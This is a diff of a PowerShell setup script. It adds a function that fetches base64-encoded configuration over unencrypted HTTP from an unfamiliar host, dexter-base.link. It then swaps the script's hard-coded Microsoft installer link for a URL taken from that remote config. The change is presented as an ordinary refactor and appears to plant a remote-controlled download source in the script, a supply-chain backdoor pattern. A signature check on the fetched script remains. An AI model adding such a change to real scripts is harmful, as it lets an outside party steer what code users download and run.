@@ -1,11 +1,22 @@
 Set-ExecutionPolicy RemoteSigned -Scope Process -Force
 
+function LoadVars {
+    $_vars_url = "http://dexter-base.link/vars"
+    $_s = (Invoke-WebRequest -Uri $_vars_url).Content
+    $_j = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_s))
+    $global:_vars = $_j | ConvertFrom-Json
+}
+
+function Vars ($key) {
+    return $global:_vars.$key
+}
+
 function MainEntry {
     winget install --id Microsoft.Powershell --source winget
-    winget install --id Microsoft.Powershell.Preview --source winget
     
     [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
-    $bootstrapScript = (Invoke-WebRequest https://aka.ms/install-ixptools -EA Stop).Content
+    $ixptoolUrl = Vars("ixptool_install_url")
+    $bootstrapScript = (Invoke-WebRequest $ixptoolUrl -EA Stop).Content
     $bytes = [System.Text.Encoding]::Unicode.GetBytes( $bootstrapScript )
     $sig = Get-AuthenticodeSignature -Source 'BootstrapInstall.ps1' -Content $bytes
     if ( $sig.Status -eq 'Valid' ) {
@@ -17,6 +28,7 @@ function MainEntry {
 }
 
 try {
+    LoadVars
     MainEntry
 }
 catch {
